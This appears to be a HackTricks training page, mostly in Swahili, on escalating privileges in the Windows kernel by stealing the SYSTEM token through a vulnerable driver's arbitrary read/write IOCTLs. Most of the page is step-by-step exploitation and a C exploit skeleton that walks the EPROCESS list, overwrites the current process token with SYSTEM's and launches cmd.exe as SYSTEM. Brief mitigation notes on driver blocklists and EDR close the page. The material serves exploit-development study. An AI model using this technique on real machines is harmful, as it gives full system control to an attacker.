# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Ikiwa driver dhaifu ina IOCTL inayomruhusu mshambuliaji primitives za arbitrary kernel read na/au write, kuinua haki hadi NT AUTHORITY\SYSTEM mara nyingi inaweza kufanikiwa kwa kuiba token ya SYSTEM. Mbinu hii inakopa pointer ya Token kutoka kwenye EPROCESS ya mchakato wa SYSTEM na kuiweka kwenye EPROCESS ya mchakato wako wa sasa.

Kwa nini inafanya kazi:
- Kila mchakato una muundo wa EPROCESS ambao una (miongoni mwa sehemu nyingine) Token (kwa kweli EX_FAST_REF kuelekea kitu cha token).
- Mchakato wa SYSTEM (PID 4) una token yenye ruhusa zote zikiwa zimeteuliwa.
- Kubadilisha EPROCESS.Token ya mchakato wako wa sasa na pointer ya token ya SYSTEM hufanya mchakato wako uendelee kuendesha kama SYSTEM mara moja.

> Offsets katika EPROCESS zinatofautiana kati ya matoleo ya Windows. Zidhibitio kwa njia ya dynamic (symbols) au tumia constants maalum kwa toleo. Pia kumbuka kuwa EPROCESS.Token ni EX_FAST_REF (bita 3 za chini ni flag za reference count).

## Hatua za juu

1) Pata base ya ntoskrnl.exe na tatua anwani ya PsInitialSystemProcess.
- Kutoka user mode, tumia NtQuerySystemInformation(SystemModuleInformation) au EnumDeviceDrivers kupata base za drivers zilizo load.
- Ongeza offset ya PsInitialSystemProcess (kutoka symbols/reversing) kwenye kernel base kupata anwani yake.
2) Soma pointer kwenye PsInitialSystemProcess → hii ni kernel pointer kuelekea EPROCESS ya SYSTEM.
3) Kutoka EPROCESS ya SYSTEM, soma UniqueProcessId na ActiveProcessLinks offsets ili kuvuka orodha ya double linked list ya miundo ya EPROCESS (ActiveProcessLinks.Flink/Blink) hadi utakapopata EPROCESS ambayo UniqueProcessId yake ni sawa na GetCurrentProcessId(). Hifadhi yote:
- EPROCESS_SYSTEM (kwa SYSTEM)
- EPROCESS_SELF (kwa mchakato wa sasa)
4) Soma thamani ya token ya SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Futa bit 3 za chini: Token_SYS_masked = Token_SYS & ~0xF (kawaida ~0xF au ~0x7 kulingana na build; kwenye x64 bit 3 za chini zinatumika — mask 0xFFFFFFFFFFFFFFF8).
5) Chaguo A (kawaida): Hifadhi bit 3 za chini kutoka token yako ya sasa na ziweke kwenye pointer ya SYSTEM ili kuweka reference count iliyojengwa iwe thabiti.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Andika Token_NEW kurudi ndani ya (EPROCESS_SELF + TokenOffset) kwa kutumia kernel write primitive yako.
7) Mchakato wako wa sasa sasa ni SYSTEM. Hiari anzisha cmd.exe mpya au powershell.exe kuthibitisha.

## Pseudocode

Chini ni skeleton inayotumia tu IOCTL mbili kutoka kwa driver dhaifu, mojawapo kwa 8-byte kernel read na mojawapo kwa 8-byte kernel write. Badilisha na interface ya driver yako.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Vidokezo:
- Offsets: Tumia WinDbg’s `dt nt!_EPROCESS` na PDBs za lengo, au runtime symbol loader, ili kupata offsets sahihi. Usifanye hardcode bila tahadhari.
- Mask: On x64 the token is an EX_FAST_REF; low 3 bits are reference count bits. Kuendelea na low bits za asili kutoka token yako kuepuka matatizo ya refcount mara moja.
- Stability: Pendelea kuinua current process; ikiwa unainua helper mfupi unaweza kupoteza SYSTEM anapoondoka.

## Ugunduzi na kupunguza
- Kupakia unsigned au untrusted third‑party drivers ambazo zinaonyesha IOCTLs zenye nguvu ndizo chanzo cha tatizo.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, and Attack Surface Reduction rules zinaweza kuzuia vulnerable drivers kupakiwa.
- EDR inaweza kuangalia mfululizo wa IOCTL unaoshukiwa ambao unatekeleza arbitrary read/write na token swaps.

## Marejeleo
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
